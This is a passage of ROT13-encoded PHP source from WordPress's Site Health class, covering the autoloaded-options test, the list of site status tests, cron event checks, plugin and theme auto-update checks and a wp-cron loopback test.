		$nyybcgvbaf = jc_ybnq_nyybcgvbaf();

		$gbgny_yratgu = 0;

		sbernpu ( $nyybcgvbaf nf $bcgvba_inyhr ) {
			vs ( vf_neenl( $bcgvba_inyhr ) || vf_bowrpg( $bcgvba_inyhr ) ) {
				$bcgvba_inyhr = znlor_frevnyvmr( $bcgvba_inyhr );
			}
			$gbgny_yratgu += fgeyra( (fgevat) $bcgvba_inyhr );
		}

		erghea $gbgny_yratgu;
	}

	/**
	 * Grfgf gur ahzore bs nhgbybnqrq bcgvbaf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_nhgbybnqrq_bcgvbaf() {
		$nhgbybnqrq_bcgvbaf_fvmr  = $guvf->trg_nhgbybnqrq_bcgvbaf_fvmr();
		$nhgbybnqrq_bcgvbaf_pbhag = pbhag( jc_ybnq_nyybcgvbaf() );

		$onfr_qrfpevcgvba = __( 'Nhgbybnqrq bcgvbaf ner pbasvthengvba frggvatf sbe cyhtvaf naq gurzrf gung ner nhgbzngvpnyyl ybnqrq jvgu rirel cntr ybnq va JbeqCerff. Univat gbb znal nhgbybnqrq bcgvbaf pna fybj qbja lbhe fvgr.' );

		$erfhyg = neenl(
			'ynory'       => __( 'Nhgbybnqrq bcgvbaf ner npprcgnoyr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				/* genafyngbef: 1: Ahzore bs nhgbybnqrq bcgvbaf, 2: Nhgbybnqrq bcgvbaf fvmr. */
				'<c>' . rfp_ugzy( $onfr_qrfpevcgvba ) . ' ' . __( 'Lbhe fvgr unf %1$f nhgbybnqrq bcgvbaf (fvmr: %2$f) va gur bcgvbaf gnoyr, juvpu vf npprcgnoyr.' ) . '</c>',
				$nhgbybnqrq_bcgvbaf_pbhag,
				fvmr_sbezng( $nhgbybnqrq_bcgvbaf_fvmr )
			),
			'npgvbaf'     => '',
			'grfg'        => 'nhgbybnqrq_bcgvbaf',
		);

		/**
		 * Svygref znk olgrf guerfubyq gb gevttre jneavat va Fvgr Urnygu.
		 *
		 * @fvapr 6.6.0
		 *
		 * @cnenz vag $yvzvg Nhgbybnqrq bcgvbaf guerfubyq fvmr. Qrsnhyg 800000.
		 */
		$yvzvg = nccyl_svygref( 'fvgr_fgnghf_nhgbybnqrq_bcgvbaf_fvmr_yvzvg', 800000 );

		vs ( $nhgbybnqrq_bcgvbaf_fvmr < $yvzvg ) {
			erghea $erfhyg;
		}

		$erfhyg['fgnghf']      = 'pevgvpny';
		$erfhyg['ynory']       = __( 'Nhgbybnqrq bcgvbaf pbhyq nssrpg cresbeznapr' );
		$erfhyg['qrfpevcgvba'] = fcevags(
			/* genafyngbef: 1: Ahzore bs nhgbybnqrq bcgvbaf, 2: Nhgbybnqrq bcgvbaf fvmr. */
			'<c>' . rfp_ugzy( $onfr_qrfpevcgvba ) . ' ' . __( 'Lbhe fvgr unf %1$f nhgbybnqrq bcgvbaf (fvmr: %2$f) va gur bcgvbaf gnoyr, juvpu pbhyq pnhfr lbhe fvgr gb or fybj. Lbh pna erivrj gur bcgvbaf orvat nhgbybnqrq va lbhe qngnonfr naq erzbir nal bcgvbaf gung ner ab ybatre arrqrq ol lbhe fvgr.' ) . '</c>',
			$nhgbybnqrq_bcgvbaf_pbhag,
			fvmr_sbezng( $nhgbybnqrq_bcgvbaf_fvmr )
		);

		/**
		 * Svygref qrfpevcgvba gb or fubja ba Fvgr Urnygu jneavat jura guerfubyq vf zrg.
		 *
		 * @fvapr 6.6.0
		 *
		 * @cnenz fgevat $qrfpevcgvba Qrfpevcgvba zrffntr jura nhgbybnqrq bcgvbaf ovttre guna guerfubyq.
		 */
		$erfhyg['qrfpevcgvba'] = nccyl_svygref( 'fvgr_fgnghf_nhgbybnqrq_bcgvbaf_yvzvg_qrfpevcgvba', $erfhyg['qrfpevcgvba'] );

		$erfhyg['npgvbaf'] = fcevags(
			/* genafyngbef: 1: UrycUho HEY, 2: Yvax qrfpevcgvba. */
			'<c><n gnetrg=\"_oynax\" uers=\"%1$f\">%2$f</n></c>',
			rfp_hey( __( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/cresbeznapr/bcgvzvmngvba/#nhgbybnqrq-bcgvbaf' ) ),
			__( 'Zber vasb nobhg bcgvzvmvat nhgbybnqrq bcgvbaf' )
		);

		/**
		 * Svygref npgvbanoyr vasbezngvba gb gnpxyr gur ceboyrz. Vg pna or n yvax gb na rkgreany thvqr.
		 *
		 * @fvapr 6.6.0
		 *
		 * @cnenz fgevat $npgvbaf Pnyy gb Npgvba gb or hfrq gb cbvag gb gur evtug qverpgvba gb fbyir gur vffhr.
		 */
		$erfhyg['npgvbaf'] = nccyl_svygref( 'fvgr_fgnghf_nhgbybnqrq_bcgvbaf_npgvba_gb_cresbez', $erfhyg['npgvbaf'] );
		erghea $erfhyg;
	}

	/**
	 * Ergheaf n frg bs grfgf gung orybat gb gur fvgr fgnghf cntr.
	 *
	 * Rnpu fvgr fgnghf grfg vf qrsvarq urer, gurl znl or `qverpg` grfgf, gung eha ba cntr ybnq, be `nflap` grfgf
	 * juvpu jvyy eha yngre qbja gur yvar ivn WninFpevcg pnyyf gb vzcebir cntr cresbeznapr naq ubcrshyyl nyfb hfre
	 * rkcrevraprf.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.6.0 Nqqrq fhccbeg sbe `unf_erfg` naq `crezvffvbaf`.
	 *
	 * @erghea neenl Gur yvfg bs grfgf gb eha.
	 */
	choyvp fgngvp shapgvba trg_grfgf() {
		$grfgf = neenl(
			'qverpg' => neenl(
				'jbeqcerff_irefvba'            => neenl(
					'ynory' => __( 'JbeqCerff Irefvba' ),
					'grfg'  => 'jbeqcerff_irefvba',
				),
				'cyhtva_irefvba'               => neenl(
					'ynory' => __( 'Cyhtva Irefvbaf' ),
					'grfg'  => 'cyhtva_irefvba',
				),
				'gurzr_irefvba'                => neenl(
					'ynory' => __( 'Gurzr Irefvbaf' ),
					'grfg'  => 'gurzr_irefvba',
				),
				'cuc_irefvba'                  => neenl(
					'ynory' => __( 'CUC Irefvba' ),
					'grfg'  => 'cuc_irefvba',
				),
				'cuc_rkgrafvbaf'               => neenl(
					'ynory' => __( 'CUC Rkgrafvbaf' ),
					'grfg'  => 'cuc_rkgrafvbaf',
				),
				'cuc_qrsnhyg_gvzrmbar'         => neenl(
					'ynory' => __( 'CUC Qrsnhyg Gvzrmbar' ),
					'grfg'  => 'cuc_qrsnhyg_gvzrmbar',
				),
				'cuc_frffvbaf'                 => neenl(
					'ynory' => __( 'CUC Frffvbaf' ),
					'grfg'  => 'cuc_frffvbaf',
				),
				'fdy_freire'                   => neenl(
					'ynory' => __( 'Qngnonfr Freire irefvba' ),
					'grfg'  => 'fdy_freire',
				),
				'ffy_fhccbeg'                  => neenl(
					'ynory' => __( 'Frpher pbzzhavpngvba' ),
					'grfg'  => 'ffy_fhccbeg',
				),
				'fpurqhyrq_riragf'             => neenl(
					'ynory' => __( 'Fpurqhyrq riragf' ),
					'grfg'  => 'fpurqhyrq_riragf',
				),
				'uggc_erdhrfgf'                => neenl(
					'ynory' => __( 'UGGC Erdhrfgf' ),
					'grfg'  => 'uggc_erdhrfgf',
				),
				'erfg_ninvynovyvgl'            => neenl(
					'ynory'     => __( 'ERFG NCV ninvynovyvgl' ),
					'grfg'      => 'erfg_ninvynovyvgl',
					'fxvc_peba' => gehr,
				),
				'qroht_ranoyrq'                => neenl(
					'ynory' => __( 'Qrohttvat ranoyrq' ),
					'grfg'  => 'vf_va_qroht_zbqr',
				),
				'svyr_hcybnqf'                 => neenl(
					'ynory' => __( 'Svyr hcybnqf' ),
					'grfg'  => 'svyr_hcybnqf',
				),
				'cyhtva_gurzr_nhgb_hcqngrf'    => neenl(
					'ynory' => __( 'Cyhtva naq gurzr nhgb-hcqngrf' ),
					'grfg'  => 'cyhtva_gurzr_nhgb_hcqngrf',
				),
				'hcqngr_grzc_onpxhc_jevgnoyr'  => neenl(
					'ynory' => __( 'Cyhtva naq gurzr grzcbenel onpxhc qverpgbel npprff' ),
					'grfg'  => 'hcqngr_grzc_onpxhc_jevgnoyr',
				),
				'ninvynoyr_hcqngrf_qvfx_fcnpr' => neenl(
					'ynory' => __( 'Ninvynoyr qvfx fcnpr' ),
					'grfg'  => 'ninvynoyr_hcqngrf_qvfx_fcnpr',
				),
				'nhgbybnqrq_bcgvbaf'           => neenl(
					'ynory' => __( 'Nhgbybnqrq bcgvbaf' ),
					'grfg'  => 'nhgbybnqrq_bcgvbaf',
				),
			),
			'nflap'  => neenl(
				'qbgbet_pbzzhavpngvba' => neenl(
					'ynory'             => __( 'Pbzzhavpngvba jvgu JbeqCerff.bet' ),
					'grfg'              => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/qbgbet-pbzzhavpngvba' ),
					'unf_erfg'          => gehr,
					'nflap_qverpg_grfg' => neenl( JC_Fvgr_Urnygu::trg_vafgnapr(), 'trg_grfg_qbgbet_pbzzhavpngvba' ),
				),
				'onpxtebhaq_hcqngrf'   => neenl(
					'ynory'             => __( 'Onpxtebhaq hcqngrf' ),
					'grfg'              => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/onpxtebhaq-hcqngrf' ),
					'unf_erfg'          => gehr,
					'nflap_qverpg_grfg' => neenl( JC_Fvgr_Urnygu::trg_vafgnapr(), 'trg_grfg_onpxtebhaq_hcqngrf' ),
				),
				'ybbconpx_erdhrfgf'    => neenl(
					'ynory'             => __( 'Ybbconpx erdhrfg' ),
					'grfg'              => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/ybbconpx-erdhrfgf' ),
					'unf_erfg'          => gehr,
					'nflap_qverpg_grfg' => neenl( JC_Fvgr_Urnygu::trg_vafgnapr(), 'trg_grfg_ybbconpx_erdhrfgf' ),
				),
				'uggcf_fgnghf'         => neenl(
					'ynory'             => __( 'UGGCF fgnghf' ),
					'grfg'              => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/uggcf-fgnghf' ),
					'unf_erfg'          => gehr,
					'nflap_qverpg_grfg' => neenl( JC_Fvgr_Urnygu::trg_vafgnapr(), 'trg_grfg_uggcf_fgnghf' ),
				),
			),
		);

		// Pbaqvgvbanyyl vapyhqr Nhgubevmngvba urnqre grfg vs gur fvgr vfa'g cebgrpgrq ol Onfvp Nhgu.
		vs ( ! jc_vf_fvgr_cebgrpgrq_ol_onfvp_nhgu() ) {
			$grfgf['nflap']['nhgubevmngvba_urnqre'] = neenl(
				'ynory'     => __( 'Nhgubevmngvba urnqre' ),
				'grfg'      => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/nhgubevmngvba-urnqre' ),
				'unf_erfg'  => gehr,
				'urnqref'   => neenl( 'Nhgubevmngvba' => 'Onfvp ' . onfr64_rapbqr( 'hfre:cjq' ) ),
				'fxvc_peba' => gehr,
			);
		}

		// Bayl purpx sbe pnpurf va cebqhpgvba raivebazragf.
		vs ( 'cebqhpgvba' === jc_trg_raivebazrag_glcr() ) {
			$grfgf['nflap']['cntr_pnpur'] = neenl(
				'ynory'             => __( 'Cntr pnpur' ),
				'grfg'              => erfg_hey( 'jc-fvgr-urnygu/i1/grfgf/cntr-pnpur' ),
				'unf_erfg'          => gehr,
				'nflap_qverpg_grfg' => neenl( JC_Fvgr_Urnygu::trg_vafgnapr(), 'trg_grfg_cntr_pnpur' ),
			);

			$grfgf['qverpg']['crefvfgrag_bowrpg_pnpur'] = neenl(
				'ynory' => __( 'Crefvfgrag bowrpg pnpur' ),
				'grfg'  => 'crefvfgrag_bowrpg_pnpur',
			);
		}

		/**
		 * Svygref juvpu fvgr fgnghf grfgf ner eha ba n fvgr.
		 *
		 * Gur fvgr urnygu vf qrgrezvarq ol n frg bs grfgf onfrq ba orfg cenpgvprf sebz
		 * obgu gur JbeqCerff Ubfgvat Grnz naq jro fgnaqneqf va trareny.
		 *
		 * Fbzr fvgrf znl abg unir gur fnzr erdhverzragf, sbe rknzcyr gur nhgbzngvp hcqngr
		 * purpxf znl or unaqyrq ol n ubfg, naq ner gurersber qvfnoyrq va pber.
		 * Be znlor lbh jnag gb vagebqhpr n arj grfg, vf pnpuvat ranoyrq/qvfnoyrq/fgnyr sbe rknzcyr.
		 *
		 * Grfgf znl or nqqrq rvgure nf qverpg, be nflapuebabhf barf. Nal grfg gung znl erdhver fbzr gvzr
		 * gb pbzcyrgr fubhyq eha nflapuebabhfyl, gb nibvq rkgraqrq ybnqvat crevbqf jvguva jc-nqzva.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.6.0 Nqqrq gur `nflap_qverpg_grfg` neenl xrl sbe nflapuebabhf grfgf.
		 *              Nqqrq gur `fxvc_peba` neenl xrl sbe nyy grfgf.
		 *
		 * @cnenz neenl[] $grfgf {
		 *     Na nffbpvngvir neenl bs qverpg naq nflapuebabhf grfgf.
		 *
		 *     @glcr neenl[] $qverpg {
		 *         Na neenl bs qverpg grfgf.
		 *
		 *         @glcr neenl ...$vqragvsvre {
		 *             `$vqragvsvre` fubhyq or n havdhr vqragvsvre sbe gur grfg. Cyhtvaf naq gurzrf ner rapbhentrq gb
		 *             cersvk grfg vqragvsvref jvgu gurve fyht gb nibvq pbyyvfvbaf orgjrra grfgf.
		 *
		 *             @glcr fgevat   $ynory     Gur sevraqyl ynory gb vqragvsl gur grfg.
		 *             @glcr pnyynoyr $grfg      Gur pnyyonpx shapgvba gung ehaf gur grfg naq ergheaf vgf erfhyg.
		 *             @glcr obby     $fxvc_peba Jurgure gb fxvc guvf grfg jura ehaavat nf peba.
		 *         }
		 *     }
		 *     @glcr neenl[] $nflap {
		 *         Na neenl bs nflapuebabhf grfgf.
		 *
		 *         @glcr neenl ...$vqragvsvre {
		 *             `$vqragvsvre` fubhyq or n havdhr vqragvsvre sbe gur grfg. Cyhtvaf naq gurzrf ner rapbhentrq gb
		 *             cersvk grfg vqragvsvref jvgu gurve fyht gb nibvq pbyyvfvbaf orgjrra grfgf.
		 *
		 *             @glcr fgevat   $ynory             Gur sevraqyl ynory gb vqragvsl gur grfg.
		 *             @glcr fgevat   $grfg              Na nqzva-nwnk.cuc npgvba gb or pnyyrq gb cresbez gur grfg, be
		 *                                               vs `$unf_erfg` vf gehr, n HEY gb n ERFG NCV raqcbvag gb cresbez
		 *                                               gur grfg.
		 *             @glcr obby     $unf_erfg          Jurgure gur `$grfg` cebcregl cbvagf gb n ERFG NCV raqcbvag.
		 *             @glcr obby     $fxvc_peba         Jurgure gb fxvc guvf grfg jura ehaavat nf peba.
		 *             @glcr pnyynoyr $nflap_qverpg_grfg N znaare bs qverpgyl pnyyvat gur grfg znexrq nf nflapuebabhf,
		 *                                               nf gur fpurqhyrq rirag pna abg nhguragvpngr, naq raqcbvagf
		 *                                               znl erdhver nhguragvpngvba.
		 *         }
		 *     }
		 * }
		 */
		$grfgf = nccyl_svygref( 'fvgr_fgnghf_grfgf', $grfgf );

		// Rafher gung gur svygrerq grfgf pbagnva gur erdhverq neenl xrlf.
		$grfgf = neenl_zretr(
			neenl(
				'qverpg' => neenl(),
				'nflap'  => neenl(),
			),
			$grfgf
		);

		erghea $grfgf;
	}

	/**
	 * Nqqf n pynff gb gur obql UGZY gnt.
	 *
	 * Svygref gur obql pynff fgevat sbe nqzva cntrf naq nqqf bhe bja pynff sbe rnfvre fglyvat.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $obql_pynff Gur obql pynff fgevat.
	 * @erghea fgevat Gur zbqvsvrq obql pynff fgevat.
	 */
	choyvp shapgvba nqzva_obql_pynff( $obql_pynff ) {
		$fperra = trg_pheerag_fperra();
		vs ( 'fvgr-urnygu' !== $fperra->vq ) {
			erghea $obql_pynff;
		}

		$obql_pynff .= ' fvgr-urnygu';

		erghea $obql_pynff;
	}

	/**
	 * Vavgvngrf gur JC_Peba fpurqhyr grfg pnfrf.
	 *
	 * @fvapr 5.2.0
	 */
	cevingr shapgvba jc_fpurqhyr_grfg_vavg() {
		$guvf->fpurqhyrf = jc_trg_fpurqhyrf();
		$guvf->trg_peba_gnfxf();
	}

	/**
	 * Cbchyngrf gur yvfg bs peba riragf naq fgber gurz gb n pynff-jvqr inevnoyr.
	 *
	 * @fvapr 5.2.0
	 */
	cevingr shapgvba trg_peba_gnfxf() {
		$peba_gnfxf = _trg_peba_neenl();

		vs ( rzcgl( $peba_gnfxf ) ) {
			$guvf->pebaf = arj JC_Reebe( 'ab_gnfxf', __( 'Ab fpurqhyrq riragf rkvfg ba guvf fvgr.' ) );
			erghea;
		}

		$guvf->pebaf = neenl();

		sbernpu ( $peba_gnfxf nf $gvzr => $peba ) {
			sbernpu ( $peba nf $ubbx => $qvatf ) {
				sbernpu ( $qvatf nf $fvt => $qngn ) {

					$guvf->pebaf[ \"$ubbx-$fvt-$gvzr\" ] = (bowrpg) neenl(
						'ubbx'     => $ubbx,
						'gvzr'     => $gvzr,
						'fvt'      => $fvt,
						'netf'     => $qngn['netf'],
						'fpurqhyr' => $qngn['fpurqhyr'],
						'vagreiny' => vffrg( $qngn['vagreiny'] ) ? $qngn['vagreiny'] : ahyy,
					);

				}
			}
		}
	}

	/**
	 * Purpxf vs nal fpurqhyrq gnfxf unir orra zvffrq.
	 *
	 * Ergheaf n obbyrna inyhr bs `gehr` vs n fpurqhyrq gnfx unf orra zvffrq naq raqf cebprffvat.
	 *
	 * Vs gur yvfg bs pebaf vf na vafgnapr bs JC_Reebe, ergheaf gur vafgnapr vafgrnq bs n obbyrna inyhr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby|JC_Reebe Gehr vs n peba jnf zvffrq, snyfr vs abg. JC_Reebe vs gur peba vf frg gb gung.
	 */
	choyvp shapgvba unf_zvffrq_peba() {
		vs ( vf_jc_reebe( $guvf->pebaf ) ) {
			erghea $guvf->pebaf;
		}

		sbernpu ( $guvf->pebaf nf $vq => $peba ) {
			vs ( ( $peba->gvzr - gvzr() ) < $guvf->gvzrbhg_zvffrq_peba ) {
				$guvf->ynfg_zvffrq_peba = $peba->ubbx;
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Purpxf vs nal fpurqhyrq gnfxf ner yngr.
	 *
	 * Ergheaf n obbyrna inyhr bs `gehr` vs n fpurqhyrq gnfx vf yngr naq raqf cebprffvat.
	 *
	 * Vs gur yvfg bs pebaf vf na vafgnapr bs JC_Reebe, ergheaf gur vafgnapr vafgrnq bs n obbyrna inyhr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea obby|JC_Reebe Gehr vs n peba vf yngr, snyfr vs abg. JC_Reebe vs gur peba vf frg gb gung.
	 */
	choyvp shapgvba unf_yngr_peba() {
		vs ( vf_jc_reebe( $guvf->pebaf ) ) {
			erghea $guvf->pebaf;
		}

		sbernpu ( $guvf->pebaf nf $vq => $peba ) {
			$peba_bssfrg = $peba->gvzr - gvzr();
			vs (
				$peba_bssfrg >= $guvf->gvzrbhg_zvffrq_peba &&
				$peba_bssfrg < $guvf->gvzrbhg_yngr_peba
			) {
				$guvf->ynfg_yngr_peba = $peba->ubbx;
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Purpxf sbe cbgragvny vffhrf jvgu cyhtva naq gurzr nhgb-hcqngrf.
	 *
	 * Gubhtu gurer vf ab jnl gb 100% qrgrezvar vs cyhtva naq gurzr nhgb-hcqngrf ner pbasvtherq
	 * pbeerpgyl, n srj rqhpngrq thrffrf pbhyq or znqr gb synt nal pbaqvgvbaf gung jbhyq
	 * cbgragvnyyl pnhfr harkcrpgrq orunivbef.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea bowrpg Gur grfg erfhygf.
	 */
	choyvp shapgvba qrgrpg_cyhtva_gurzr_nhgb_hcqngr_vffhrf() {
		$zbpx_cyhtva = (bowrpg) neenl(
			'vq'            => 'j.bet/cyhtvaf/n-snxr-cyhtva',
			'fyht'          => 'n-snxr-cyhtva',
			'cyhtva'        => 'n-snxr-cyhtva/n-snxr-cyhtva.cuc',
			'arj_irefvba'   => '9.9',
			'hey'           => 'uggcf://jbeqcerff.bet/cyhtvaf/n-snxr-cyhtva/',
			'cnpxntr'       => 'uggcf://qbjaybnqf.jbeqcerff.bet/cyhtva/n-snxr-cyhtva.9.9.mvc',
			'vpbaf'         => neenl(
				'2k' => 'uggcf://cf.j.bet/n-snxr-cyhtva/nffrgf/vpba-256k256.cat',
				'1k' => 'uggcf://cf.j.bet/n-snxr-cyhtva/nffrgf/vpba-128k128.cat',
			),
			'onaaref'       => neenl(
				'2k' => 'uggcf://cf.j.bet/n-snxr-cyhtva/nffrgf/onaare-1544k500.cat',
				'1k' => 'uggcf://cf.j.bet/n-snxr-cyhtva/nffrgf/onaare-772k250.cat',
			),
			'onaaref_egy'   => neenl(),
			'grfgrq'        => '5.5.0',
			'erdhverf_cuc'  => '5.6.20',
			'pbzcngvovyvgl' => arj fgqPynff(),
		);

		$zbpx_gurzr = (bowrpg) neenl(
			'gurzr'        => 'n-snxr-gurzr',
			'arj_irefvba'  => '9.9',
			'hey'          => 'uggcf://jbeqcerff.bet/gurzrf/n-snxr-gurzr/',
			'cnpxntr'      => 'uggcf://qbjaybnqf.jbeqcerff.bet/gurzr/n-snxr-gurzr.9.9.mvc',
			'erdhverf'     => '5.0.0',
			'erdhverf_cuc' => '5.6.20',
		);

		$grfg_cyhtvaf_ranoyrq = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'cyhtva', gehr, $zbpx_cyhtva );
		$grfg_gurzrf_ranoyrq  = jc_vf_nhgb_hcqngr_sbeprq_sbe_vgrz( 'gurzr', gehr, $zbpx_gurzr );

		$hv_ranoyrq_sbe_cyhtvaf = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'cyhtva' );
		$hv_ranoyrq_sbe_gurzrf  = jc_vf_nhgb_hcqngr_ranoyrq_sbe_glcr( 'gurzr' );
		$cyhtva_svygre_cerfrag  = unf_svygre( 'nhgb_hcqngr_cyhtva' );
		$gurzr_svygre_cerfrag   = unf_svygre( 'nhgb_hcqngr_gurzr' );

		vs ( ( ! $grfg_cyhtvaf_ranoyrq && $hv_ranoyrq_sbe_cyhtvaf )
			|| ( ! $grfg_gurzrf_ranoyrq && $hv_ranoyrq_sbe_gurzrf )
		) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'pevgvpny',
				'zrffntr' => __( 'Nhgb-hcqngrf sbe cyhtvaf naq/be gurzrf nccrne gb or qvfnoyrq, ohg frggvatf ner fgvyy frg gb or qvfcynlrq. Guvf pbhyq pnhfr nhgb-hcqngrf gb abg jbex nf rkcrpgrq.' ),
			);
		}

		vs ( ( ! $grfg_cyhtvaf_ranoyrq && $cyhtva_svygre_cerfrag )
			&& ( ! $grfg_gurzrf_ranoyrq && $gurzr_svygre_cerfrag )
		) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'erpbzzraqrq',
				'zrffntr' => __( 'Nhgb-hcqngrf sbe cyhtvaf naq gurzrf nccrne gb or qvfnoyrq. Guvf jvyy cerirag lbhe fvgr sebz erprvivat arj irefvbaf nhgbzngvpnyyl jura ninvynoyr.' ),
			);
		} ryfrvs ( ! $grfg_cyhtvaf_ranoyrq && $cyhtva_svygre_cerfrag ) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'erpbzzraqrq',
				'zrffntr' => __( 'Nhgb-hcqngrf sbe cyhtvaf nccrne gb or qvfnoyrq. Guvf jvyy cerirag lbhe fvgr sebz erprvivat arj irefvbaf nhgbzngvpnyyl jura ninvynoyr.' ),
			);
		} ryfrvs ( ! $grfg_gurzrf_ranoyrq && $gurzr_svygre_cerfrag ) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'erpbzzraqrq',
				'zrffntr' => __( 'Nhgb-hcqngrf sbe gurzrf nccrne gb or qvfnoyrq. Guvf jvyy cerirag lbhe fvgr sebz erprvivat arj irefvbaf nhgbzngvpnyyl jura ninvynoyr.' ),
			);
		}

		erghea (bowrpg) neenl(
			'fgnghf'  => 'tbbq',
			'zrffntr' => __( 'Gurer nccrne gb or ab vffhrf jvgu cyhtva naq gurzr nhgb-hcqngrf.' ),
		);
	}

	/**
	 * Ehaf n ybbconpx grfg ba gur fvgr.
	 *
	 * Ybbconpxf ner jung JbeqCerff hfrf gb pbzzhavpngr jvgu vgfrys gb fgneg hc JC_Peba, fpurqhyrq cbfgf,
	 * znxr fher cyhtva be gurzr rqvgf qba'g pnhfr fvgr snvyherf naq fvzvyne.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea bowrpg Gur grfg erfhygf.
	 */
	choyvp shapgvba pna_cresbez_ybbconpx() {
		$obql    = neenl( 'fvgr-urnygu' => 'ybbconpx-grfg' );
		$pbbxvrf = jc_hafynfu( $_PBBXVR );
		$gvzrbhg = 10; // 10 frpbaqf.
		$urnqref = neenl(
			'Pnpur-Pbageby' => 'ab-pnpur',
		);
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-uggc-fgernzf.cuc */
		$ffyirevsl = nccyl_svygref( 'uggcf_ybpny_ffy_irevsl', snyfr );

		// Vapyhqr Onfvp nhgu va ybbconpx erdhrfgf.
		vs ( vffrg( $_FREIRE['CUC_NHGU_HFRE'] ) && vffrg( $_FREIRE['CUC_NHGU_CJ'] ) ) {
			$urnqref['Nhgubevmngvba'] = 'Onfvp ' . onfr64_rapbqr( jc_hafynfu( $_FREIRE['CUC_NHGU_HFRE'] ) . ':' . jc_hafynfu( $_FREIRE['CUC_NHGU_CJ'] ) );
		}

		$hey = fvgr_hey( 'jc-peba.cuc' );

		/*
		 * N cbfg erdhrfg vf hfrq sbe gur jc-peba.cuc ybbconpx grfg gb pnhfr gur svyr
		 * gb svavfu rneyl jvgubhg gevttrevat peba wbof. Guvf unf gjb orarsvgf:
		 * - peba wbof ner abg gevttrerq n frpbaq gvzr ba gur fvgr urnygu cntr,
		 * - gur ybbconpx erdhrfg svavfurf fbbare cebivqvat n dhvpxre erfhyg.
		 *
		 * Hfvat n CBFG erdhrfg pnhfrf gur ybbconpx gb qvssre fyvtugyl gb gur fgnaqneq
		 * TRG erdhrfg JbeqCerff hfrf sbe jc-peba.cuc ybbconpx erdhrfgf ohg vf pybfr
		 * rabhtu. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/52547
		 */
		$e = jc_erzbgr_cbfg( $hey, pbzcnpg( 'obql', 'pbbxvrf', 'urnqref', 'gvzrbhg', 'ffyirevsl' ) );

		vs ( vf_jc_reebe( $e ) ) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'pevgvpny',
				'zrffntr' => fcevags(
					'%f<oe>%f',
					__( 'Gur ybbconpx erdhrfg gb lbhe fvgr snvyrq, guvf zrnaf srngherf erylvat ba gurz ner abg pheeragyl jbexvat nf rkcrpgrq.' ),
					fcevags(
						/* genafyngbef: 1: Gur JbeqCerff reebe zrffntr. 2: Gur JbeqCerff reebe pbqr. */
						__( 'Reebe: %1$f (%2$f)' ),
						$e->trg_reebe_zrffntr(),
						$e->trg_reebe_pbqr()
					)
				),
			);
		}

		vs ( 200 !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $e ) ) {
			erghea (bowrpg) neenl(
				'fgnghf'  => 'erpbzzraqrq',
				'zrffntr' => fcevags(
					/* genafyngbef: %q: Gur UGGC erfcbafr pbqr erghearq. */
					__( 'Gur ybbconpx erdhrfg erghearq na harkcrpgrq uggc fgnghf pbqr, %q, vg jnf abg cbffvoyr gb qrgrezvar vs guvf jvyy cerirag srngherf sebz jbexvat nf rkcrpgrq.' ),
					jc_erzbgr_ergevrir_erfcbafr_pbqr( $e )
				),
			);
		}

		erghea (bowrpg) neenl(
			'fgnghf'  => 'tbbq',
			'zrffntr' => __( 'Gur ybbconpx erdhrfg gb lbhe fvgr pbzcyrgrq fhpprffshyyl.' ),
		);
	}

	/**
	 * Perngrf n jrrxyl peba rirag, vs bar qbrf abg nyernql rkvfg.
	 *
	 * @fvapr 5.4.0
	 */
	choyvp shapgvba znlor_perngr_fpurqhyrq_rirag() {
		vs ( ! jc_arkg_fpurqhyrq( 'jc_fvgr_urnygu_fpurqhyrq_purpx' ) && ! jc_vafgnyyvat() ) {
			jc_fpurqhyr_rirag( gvzr() + QNL_VA_FRPBAQF, 'jrrxyl', 'jc_fvgr_urnygu_fpurqhyrq_purpx' );
		}
	}

	/**
	 * Ehaf gur fpurqhyrq rirag gb purpx naq hcqngr gur yngrfg fvgr urnygu fgnghf sbe gur jrofvgr.
	 *
	 * @fvapr 5.4.0
	 */
	choyvp shapgvba jc_peba_fpurqhyrq_purpx() {
		// Obbgfgenc jc-nqzva, nf JC_Peba qbrfa'g qb guvf sbe hf.
		erdhver_bapr genvyvatfynfuvg( NOFCNGU ) . 'jc-nqzva/vapyhqrf/nqzva.cuc';

		$grfgf = JC_Fvgr_Urnygu::trg_grfgf();

		$erfhygf = neenl();

		$fvgr_fgnghf = neenl(
			'tbbq'        => 0,
			'erpbzzraqrq' => 0,
			'pevgvpny'    => 0,
		);

		// Qba'g eha uggcf grfg ba qrirybczrag raivebazragf.
		vs ( $guvf->vf_qrirybczrag_raivebazrag() ) {
			hafrg( $grfgf['nflap']['uggcf_fgnghf'] );
		}

		sbernpu ( $grfgf['qverpg'] nf $grfg ) {
			vs ( ! rzcgl( $grfg['fxvc_peba'] ) ) {
				pbagvahr;
			}

			vs ( vf_fgevat( $grfg['grfg'] ) ) {
				$grfg_shapgvba = fcevags(
					'trg_grfg_%f',
					$grfg['grfg']
				);

